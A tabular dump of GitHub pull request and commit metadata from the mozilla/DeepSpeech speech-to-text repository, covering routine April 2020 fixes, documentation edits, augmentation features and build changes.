1044,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2926,2926,M-AILAB importer: Ensure all samples are 16 kHz,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2020-04-20T14:01:51Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e99e06a278725917fda26f74c59e186524325a7c,M-AILAB importer: Ensure all samples are 16 kHz
1045,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2925,2925,Add missing external scorer,Bug fix to missing external scorer handling in evaluate_tflite.py,Jendker,14967831,2020-04-20T13:45:19Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a4b08594eb39c409020150f1a4f92c01be787105,Added missing external scorer
1046,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2922,2922,M-AILAB importer: Ensure all samples are 16 kHz,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2020-04-20T12:54:03Z,CONTRIBUTOR,False,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f9d802d926112d696328a844fbe2278a1af46e7,M-AILAB importer: Ensure all samples are 16 kHz
1047,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2921,2921,Force ds-swig first in PATH to avoid messing if system-wide exists,,lissyx,1645737,2020-04-20T10:40:40Z,COLLABORATOR,True,3,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b7724e5596f2bbd6372823db82162b6a193368a,Force ds-swig first in PATH to avoid messing if system-wide exists
1048,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2921,2921,Force ds-swig first in PATH to avoid messing if system-wide exists,,lissyx,1645737,2020-04-20T10:40:40Z,COLLABORATOR,True,3,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67522cc9863963ead247cbe1f7ab2c7394ae3f44,Force numba pinned version
1049,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2921,2921,Force ds-swig first in PATH to avoid messing if system-wide exists,,lissyx,1645737,2020-04-20T10:40:40Z,COLLABORATOR,True,3,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8835b4d64a80becaee61e1716b876f87136b0c41,Force numba pinned version
1050,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2917,2917,checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T18:30:55Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d9d33654795d5c48194bb0f59b591c411b1651d,Update TRAINING.rst
1051,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2917,2917,checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T18:30:55Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cb2b306446eb92a145ce85cb4be20ae401a022b8,test for link
1052,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2917,2917,checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T18:30:55Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eba069cd8690cd9993e51d88c81d04dbf6b91263,back to origin
1053,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2917,2917,checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T18:30:55Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,836522c4baf00a615710f4f8258130ac35814a7c,working ref
1054,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2917,2917,checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T18:30:55Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e8b7528e4f7e3364197d2d6ec94e60dd8ee570a1,update using.rst
1055,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2917,2917,checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T18:30:55Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6d47a40066de73a132761a767275d6eee220f1a,find flags.py
1056,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2916,2916,Checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T17:31:31Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d9d33654795d5c48194bb0f59b591c411b1651d,Update TRAINING.rst
1057,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2916,2916,Checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T17:31:31Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cb2b306446eb92a145ce85cb4be20ae401a022b8,test for link
1058,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2916,2916,Checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T17:31:31Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eba069cd8690cd9993e51d88c81d04dbf6b91263,back to origin
1059,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2916,2916,Checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T17:31:31Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,836522c4baf00a615710f4f8258130ac35814a7c,working ref
1060,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2916,2916,Checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T17:31:31Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e8b7528e4f7e3364197d2d6ec94e60dd8ee570a1,update using.rst
1061,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2916,2916,Checking errors in USING.rst and TRAINING.rst,,yuri20198,54778084,2020-04-18T17:31:31Z,NONE,False,11,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b6d47a40066de73a132761a767275d6eee220f1a,find flags.py
1062,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2915,2915,Delay beam expansion until a non-blank label has probability >0.1%,,reuben,477142,2020-04-17T16:07:41Z,MEMBER,True,16,10,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33760a6bcd5b86285418507c95caa6840513c1c3,Delay beam expansion until a non-blank label has probability >0.1%
1063,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2912,2912,Transfer Learning docs,new branch rebased on master,JRMeyer,8389864,2020-04-17T01:32:50Z,CONTRIBUTOR,True,32,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2342ba795652990a30f828e7f1e122c535703959,rebased docs on master
1064,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2911,2911,import_lingua_libre.py: n channels + bitdepth,"This gets rid of some assertion errors, at least with the Polish dataset",jimregan,227350,2020-04-16T20:53:17Z,CONTRIBUTOR,True,3,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a7e4ea3488cca45eaa4be58c7142742a29914d6,import_lingua_libre.py: n channels + bitdepth
1065,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2910,2910,Documentation Suggestion: SoX installation needed for MacOS command-line-client,The MacOS command line client won't be able to find libsox unless the user themselves installs SoX.,madprogramer,3719664,2020-04-16T13:05:15Z,CONTRIBUTOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aad7f539420fb1cd4205bbfbe131d68637c3551c,"Added: SoX installation needed for MacOS command-line-client

The MacOS command line client won't be able to find libsox unless the user themselves installs SoX."
1066,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2909,2909,Documentation Suggestion: native_client can be found in the releases,I wanted to install the binary without cloning the entire repository (and thereby the required `util/taskcluster.py`) and was only able to find it pretty much by chance. I feel that adding this into the README could save people from a few headaches.,madprogramer,3719664,2020-04-16T12:54:15Z,CONTRIBUTOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e6779e8f848b0af72231a985529e64155f7dd6e8,"Added: native_client can be found in the releases

I wanted to install the binary without cloning the entire repository (and thereby the required `util/taskcluster.py`) and was only able to find it pretty much by chance. I feel that adding this into the README could save people from a few headaches."
1067,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2907,2907,fix README command,"the `deepspeech` command doesn't take the argument `--scorer`. This PR removes the `--scorer` argument from the README.

Will fix the error that I'm getting:
```
deepspeech: error: unrecognized arguments: --scorer deepspeech-0.6.1-models/kenlm.scorer
```",ericruleman,41025600,2020-04-16T02:29:06Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,febd343c5c0677f2d0763dd607983f27e48e97e6,"fix README commands

the 'deepspeech' command doesn't take the argument '--scorer'. This PR removes the '--scorer' argument from the README."
1068,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2906,2906,Changed tensorflow to tensorflow-gpu,I believe it would be useful to use tf-gpu instead of the cpu version of tf whenever possible. Nobody will seriously attempt to e.g. train on the cpu version I believe.,NormanTUD,34073778,2020-04-15T12:53:37Z,CONTRIBUTOR,False,5,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f85b2e5e3347762699032bb0b1bfe46232b5c43,Changed tensorflow to tensorflow-gpu
1069,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2906,2906,Changed tensorflow to tensorflow-gpu,I believe it would be useful to use tf-gpu instead of the cpu version of tf whenever possible. Nobody will seriously attempt to e.g. train on the cpu version I believe.,NormanTUD,34073778,2020-04-15T12:53:37Z,CONTRIBUTOR,False,5,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6334f38f6e416a3fa769f373757739be99078478,added git lfs message
1070,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32602657ba74f1b9ee92c643fbf4801b43ee21f6,Refactor generate package.
1071,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,90cd2c46bd8865e33d883115233f3571e75ce6ea,Update generate_lm.py example command.
1072,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e1cda535e7879f8be6ffe08889c36c1e53bc7d30,Update readme.
1073,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bafaebfebef7328fb03c184efae4eccad1868bd1,Better line spacings.
1074,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d5f55d8ad91d66da1de5463d93d56e096a4f518,Update readme.
1075,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8b1ecd3980e2099fc47b6dc8c2b53b9ebcc6624f,Update readme.
1076,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,03546b0b4f412c842c3af71697a22438fdf676ba,Add flag type.
1077,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ee1e1a07ebbdec279af9bbb88fef91300cc0e671,Update readme.
1078,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3cbfc5f0943e4e8196b689b4ba0dcc610b8692ac,Update readme.
1079,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f47e44eb09af8b8acc460eae4d6a8ee2085db167,Update readme.
1080,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e8213abb0c054a4030039c21363f37ca1c32351,Update readme.
1081,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b98ac4a649d890a87a4cf7557b05c47eb5c2798,Update readme.
1082,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8060dd45770d8750d7e691b2b74337001096f010,Move flag check.
1083,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d7f97321081842ad8e0f04d2455276bf73e5df0,Swap default case.
1084,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a9d93e6a1a1dc0f7c2c3d9c8ecab6a6680f4b9e,Add tristate class again.
1085,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2903,2903,Refactor generate_package.py,"Removed tristate class for better readability.

Also updated `--kenlm_bins` parameter to use path from docker container, that users don't have to search for the installation path.",DanBmh,18572490,2020-04-14T12:56:12Z,CONTRIBUTOR,True,15,17,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,91fa7ed6a2fc042c6354f9900030f1e137f917c4,Fix value attribute
1086,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2901,2901,Use Alphabet to compute string values in get_prev_* (Fixes #2526),,reuben,477142,2020-04-13T08:14:26Z,MEMBER,True,18,21,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fa1839a7f3f8bfb4ceb68c7785533c7e52c3c61,Use Alphabet to compute string values in get_prev_*
1087,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2900,2900,Fix documentation typos in section Augmentation,Fix minor typos in the TRAINING documentation augmentation section.,chrillemanden,37117239,2020-04-12T14:04:19Z,CONTRIBUTOR,True,3,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,737c92f962c695ef614894d5ad5fb829e4f0d529,Fix documentation typos in section Augmentation
1088,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2897,2897,Live augmentation,,tilmankamp,5991088,2020-04-09T12:33:27Z,CONTRIBUTOR,True,1065,154,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,927859728f30c020026025ce5743184ccc07dc16,"Named tuple AudioFormat, parameter re-ordering in util.audio and NP to PCM conversion support"
1089,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2897,2897,Live augmentation,,tilmankamp,5991088,2020-04-09T12:33:27Z,CONTRIBUTOR,True,1065,154,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c5ceee26dddf0e41486a09566d99c0128fe0476b,Live audio augmentation
1090,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2897,2897,Live augmentation,,tilmankamp,5991088,2020-04-09T12:33:27Z,CONTRIBUTOR,True,1065,154,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,64e14886b83ea96818fe93cbc7ca0b8dd51b4ba6,"Apply suggestions from code review

Co-authored-by: Reuben Morais <reuben.morais@gmail.com>"
1091,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2897,2897,Live augmentation,,tilmankamp,5991088,2020-04-09T12:33:27Z,CONTRIBUTOR,True,1065,154,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a5303ccca6973656b5fe464a22d463e0845f03b1,Renamed prepare_samples to augment_samples
1092,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2897,2897,Live augmentation,,tilmankamp,5991088,2020-04-09T12:33:27Z,CONTRIBUTOR,True,1065,154,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b08e595a750568426c55813e8b6a464bafc9171,Value range unit tests
1093,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2897,2897,Live augmentation,,tilmankamp,5991088,2020-04-09T12:33:27Z,CONTRIBUTOR,True,1065,154,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96caa2d1157d4c5d2b7882c7135c37dab12705a7,Follow up on PR comments
1094,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2897,2897,Live augmentation,,tilmankamp,5991088,2020-04-09T12:33:27Z,CONTRIBUTOR,True,1065,154,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ac9a17d8a7342f88d9dc4a30ba0411baf569001d,Moved signal augmentation tests to own test config
1095,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2894,2894,Fix #2885: Improve ds-swig integration,,lissyx,1645737,2020-04-08T13:11:04Z,COLLABORATOR,True,57,52,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8d5e6f3585ec2381a2bb2a2c6dab222838201be,Fix #2885: Improve ds-swig integration
1096,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2894,2894,Fix #2885: Improve ds-swig integration,,lissyx,1645737,2020-04-08T13:11:04Z,COLLABORATOR,True,57,52,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7deb9ee796626de23a1d77d844d58d0b52652b5,Ensure docker build pip really install locally built package
1097,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2893,2893,Example api net,,lissyx,1645737,2020-04-08T10:11:15Z,COLLABORATOR,True,44,9,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2b51316d682dddbffe22ed8496018ab71230e412,Add .Net API usage example
1098,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2893,2893,Example api net,,lissyx,1645737,2020-04-08T10:11:15Z,COLLABORATOR,True,44,9,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d398b64d8c3d101cfa23f085694d6b1cf7ea0e6,Fix DeepSpeechStream reference
1099,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2893,2893,Example api net,,lissyx,1645737,2020-04-08T10:11:15Z,COLLABORATOR,True,44,9,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c28d7dd9c43556e7058aa3794f15b2edd43c7eb7,Fix useless parsing of doc/node_modules/
1100,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2893,2893,Example api net,,lissyx,1645737,2020-04-08T10:11:15Z,COLLABORATOR,True,44,9,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a699896282e4e85185dd8866da6cd1f89458dd7b,Update Sphinx deps
1101,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2890,2890,Name section more explicit,,lissyx,1645737,2020-04-07T17:49:30Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75a0205b37a8355fd6f9fe9e53b32aac68528bda,Name section more explicit
1102,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2889,2889,Fix #2888: Use start-after / end-before for API example line references,,lissyx,1645737,2020-04-07T11:30:59Z,COLLABORATOR,True,48,8,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e3c5e9131222dd1b825939a5d3b92d0cb3ce944,Fix #2888: Use start-after / end-before for API example line references
1103,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2887,2887,only drop layers if in training phase,,JRMeyer,8389864,2020-04-07T02:19:23Z,CONTRIBUTOR,False,9,9,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a9679e8f5f9a114d129aba9960ead8be586e13d,only drop layers if in training phase
1104,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2886,2886,WIP index.ts,,reuben,477142,2020-04-07T00:31:48Z,MEMBER,False,320,540,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4658cfbcd7e2d2a3858cfd93b7edabd5d827b8a6,WIP index.ts
1105,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2884,2884,Only allow graph/layer initialization at start of training (Fixes #2883),,reuben,477142,2020-04-04T15:53:51Z,MEMBER,True,71,102,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc7a0ada46b1e2d431953a8e5d013ebb2e861965,Only allow graph/layer initialization at start of training
1106,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2884,2884,Only allow graph/layer initialization at start of training (Fixes #2883),,reuben,477142,2020-04-04T15:53:51Z,MEMBER,True,71,102,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c6e90868eeda97155aeb458fa0e6a5d3b46a7a8,Split --load into two to avoid unexpected behavior at evaluation time
1107,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2882,2882,Pr2876,,lissyx,1645737,2020-04-02T14:02:17Z,COLLABORATOR,True,317,72,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be40b07307ed36061b38b54dc6e45ce4d5081f98,"Add type declaration file for v0.7.0

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>"
1108,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2882,2882,Pr2876,,lissyx,1645737,2020-04-02T14:02:17Z,COLLABORATOR,True,317,72,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,510d71353f00ded50076cc242cf0a0858f225b66,"Update README

Signed-off-by: Anas Abou Allaban <aabouallaban@pm.me>"
1109,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2882,2882,Pr2876,,lissyx,1645737,2020-04-02T14:02:17Z,COLLABORATOR,True,317,72,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,567595aa5a08b91486d0be28d4f0d27d272f7b22,Package and expose TypeScript for JS interface
